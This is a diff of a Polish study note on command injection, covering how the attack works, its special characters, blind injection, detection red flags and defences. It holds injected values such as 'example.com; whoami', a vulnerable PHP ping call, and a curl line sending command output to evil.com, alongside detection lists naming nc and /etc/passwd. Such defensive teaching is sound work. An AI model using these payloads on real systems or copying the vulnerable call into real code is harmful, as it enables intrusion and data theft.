@@ -1,20 +1,20 @@
 # command_injection 
 
 ## Cel
-Poznanie mechaniki działania ataku Command Injection, sposóbów jego wykrycia oraz zabezpiecznia się przed nim.
+Poznanie mechaniki działania ataku Command Injection, sposobów jego wykrycia oraz zabezpieczania się przed nim.
 
-## Co to jest: 
+## Co to jest 
 - jest to atak, w którym atakujący wstrzykuje polecenie systemowe w dane wejściowe aplikacji, które następnie trafiają do wykonania przez system operacyjny serwera. 
 
-## Cel: 
+## Cel 
 - uruchomienie dowolnego polecenia na serwerze, 
 - odczytanie plików systemowych (`/etc/passwd`, `/etc/shadow`),
 - pobranie i uruchomienie złośliwego skryptu, 
 - otworzenie reverse shell, 	
 - przejęcie pełnej kontroli nad systemem, 
 
-## Działanie ataku:
-- aplikacja ma funkcję, która wywołuje polecenie systemowe, np. pinguje hosta podanego przez użytkownika - `system("ping -c 1 " . $GRT['hist']);`, 
+## Działanie ataku
+- aplikacja ma funkcję, która wywołuje polecenie systemowe, np. pinguje hosta podanego przez użytkownika - `system("ping -c 1 " . $GET['host']);`, 
 - gdy użytkownik wpisuje np. example.com - aplikacja wykonuje ping example.com, 
 - atakujący wpisuje example.com; whoami, 
 - `;` kończy pierwsze polecenie i uruchamia drugie, więc system wykonuje oba, 
@@ -23,29 +23,30 @@ Poznanie mechaniki działania ataku Command Injection, sposóbów jego wykrycia 
 - znaki używane przez atakującego:
 	- `;` - kończy pierwsze polecenie i zaczyna drugie, 
 	- `|` - przekazuje wynik jednego polecenia do drugiego, 
-	- `&&` - wykonaj drugie jeśli pierwsze się uda, 
+	- `&&` - wykonaj drugie, jeśli pierwsze się uda, 
 	- `||` - wykonaj drugie polecenie jeśli pierwsze się nie uda, 
-	- `$(uname -a)` - wykonaj polecenie w nawiasie, 
-- gdy aplikacja nie pokazuje wyniku polecenia, atakujący nadal może je wykonać i wnioskować wynik z zachowania serwera (np. czas odpowiedzi, kod błędu, żądanie do zewnętrznego serwera). 
+	- `$(uname -a)` - wstaw wynik polecenia, (w ataku `$(uname -a)` w parametrze oznacza: wykonaj `uname -a` i wstaw jego wynik w to miejsce),  
+	- `` ` `` - wykonaj polecenie w środku (backtick),
+- Blind Command Injection - gdy aplikacja nie pokazuje wyniku polecenia, atakujący nadal może je wykonać i wnioskować wynik z zachowania serwera (np. czas odpowiedzi, kod błędu, żądanie do zewnętrznego serwera), np. `curl http://evil.com/$/(whoami)` - atakujący wysyła wynik polecenia na swój serwer.  
 
-## Jak wykryć:
+## Jak wykryć
 - payload jest w URL - więc widać go w logach serwera: 
 	- `GET /ping?host=google.com;whoami HTTP/1.1` 
 - czerwone flagi:
 	- `;`, `|`, `&&`, `||`, `$()` w parametrach - oznacza próbę dopisania polecenia, 
-	- nazwy poleceń: `whoami`, `id`, `ls`, `cat`, `uname`, `wget`, `curl`, `nc` - to polecenia systemowe, które może spróbować wykonać atakujący, 
+	- nazwy poleceń: `whoami`, `id`, `ls`, `cat`, `uname`, `wget`, `curl`, `nc` (netcat - używany do reverse shell) - to polecenia systemowe, które może spróbować wykonać atakujący, 
 	- ścieżki `/etc/passwd`, `/bin/bash` - próba odczytu plików systemowych, 
-	- zakodowane wersje `%3V` -> `;`, `%7c` -> `|`, `%26` -> `&` - próba obejścia filtrów, 
+	- zakodowane wersje `%3B` -> `;`, `%7C` -> `|`, `%26` -> `&` - próba obejścia filtrów, 
 	- duże opóźnienia w odpowiedziach - możliwy blind injection, 
 - dodatkowe źródła wykrycia: 
 	- WAF - loguje payloady, które wyzwoliły reguły, 
 	- Logi aplikacji - jeśli loguje wywołanie `system() / exec()`, 
-	- monitoring procesów - nietypowe procesy uruchamiane przez użytkownika aplikacji (no. `www-data` uruchamia `whoami`).
+	- monitoring procesów - nietypowe procesy uruchamiane przez użytkownika aplikacji (np. `www-data` uruchamia `whoami`).
 
-## Jak się bronić:
+## Jak się bronić
 - unikanie wywołań systemowych - jeśli to jest możliwe, lepiej użyć biblioteki zamiast `system()`, `exec()`, `shell_exec()`. To pozwala ominąć powłokę systemową, a aplikacja sama robi to, co potrzebuje używając wbudowanej funkcji lub biblioteki. Np. zamiast `ping` przez system -> biblioteka do ICMP w PHP,
 - biała lista - pozwolenie tylko na konkretne, bezpieczne wartości, np. znaki alfanumeryczne, tylko konkretne hosty, 
-- escapowanie - escapowanie znaków specjalnym przed przekazaniem do systemu (`escapeshellarg()` w PHP),
+- escapowanie - escapowanie znaków specjalnych przed przekazaniem do systemu (`escapeshellarg()` w PHP),
 - zasada minimalnych uprawnień - aplikacja nie powinna działać jako root - to ogranicza skutki ataku, 
 - WAF - blokowanie payloadów z `;`, `|`, `&&`, 
 - monitoring - ustawienie alertów na polecenia systemowe w logach oraz na nietypowe procesy. 
